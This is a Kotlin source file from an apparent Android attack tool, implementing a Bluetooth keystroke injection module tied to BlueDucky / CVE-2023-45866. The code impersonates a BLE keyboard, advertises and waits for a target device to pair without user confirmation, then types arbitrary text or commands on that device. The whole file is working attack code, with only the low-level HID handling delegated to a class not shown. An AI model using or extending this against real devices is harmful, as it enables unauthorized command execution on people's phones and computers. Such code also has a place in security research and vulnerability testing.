package com.hereliesaz.blusnu.data

import android.util.Log
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.withTimeoutOrNull

/**
 * Module responsible for Keystroke Injection attacks (e.g., BlueDucky / CVE-2023-45866).
 *
 * This attack exploits the "Just Works" pairing mechanism where an attacker
 * impersonates a Human Interface Device (HID) like a keyboard. On vulnerable devices,
 * the pairing occurs without user confirmation, allowing the attacker to inject
 * arbitrary keystrokes (scripts).
 *
 * Delegates all BLE HID operations to [BleHidController].
 */
class KeystrokeInjectionModule(private val hidController: BleHidController) {

    companion object {
        private const val TAG = "KeystrokeInjectionModule"

        /** Timeout in milliseconds to wait for a BLE HID connection after advertising starts. */
        private const val CONNECTION_TIMEOUT_MS = 30_000L

        /** If more than 10% of keystrokes fail, sendKeystrokes returns false. */
        private const val FAILURE_THRESHOLD_PERCENT = 10
    }

    // Fix 2.8: Store target device address to filter connections
    private var targetAddress: String? = null

    /**
     * Initializes the BLE HID GATT server and begins advertising. Waits up to
     * [CONNECTION_TIMEOUT_MS] for the target device to connect.
     *
     * @param device The target device. Its address is stored to filter incoming connections.
     * @return `true` if a device connected within the timeout, `false` on error or timeout.
     */
    suspend fun attemptPairing(device: TargetDevice): Boolean {
        // Fix 2.8: Store the target address for connection filtering
        targetAddress = device.macAddress
        Log.d(TAG, "Targeting device: ${device.name ?: device.macAddress}")

        // Initialize the GATT server (registers HID service, battery service, etc.)
        hidController.initialize()

        // Check if initialization failed
        if (hidController.connectionState.value == HidConnectionState.ERROR) {
            return false
        }

        // Start BLE advertising so the target can discover and connect to us
        hidController.startAdvertising()

        // Wait for the connection state to reach CONNECTED or ERROR
        val finalState = withTimeoutOrNull(CONNECTION_TIMEOUT_MS) {
            hidController.connectionState.first { state ->
                state == HidConnectionState.CONNECTED || state == HidConnectionState.ERROR
            }
        }

        return finalState == HidConnectionState.CONNECTED
    }

    /**
     * Injects a sequence of keystrokes (text or commands) via the BLE HID connection.
     *
     * @param text The string to type on the target device.
     * @return `true` if sent successfully with acceptable failure rate, `false` if not
     *         connected or if more than [FAILURE_THRESHOLD_PERCENT]% of keystrokes failed.
     */
    suspend fun sendKeystrokes(text: String): Boolean {
        if (hidController.connectionState.value != HidConnectionState.CONNECTED) {
            return false
        }

        // Fix 2.9: Track per-character success/failure and return accurate result
        val failures = hidController.typeString(text)
        val total = text.length
        if (total == 0) return true

        val failurePercent = (failures * 100) / total
        if (failures > 0) {
            Log.w(TAG, "Keystroke injection: $failures/$total characters failed ($failurePercent%)")
        }
        return failurePercent <= FAILURE_THRESHOLD_PERCENT
    }
}
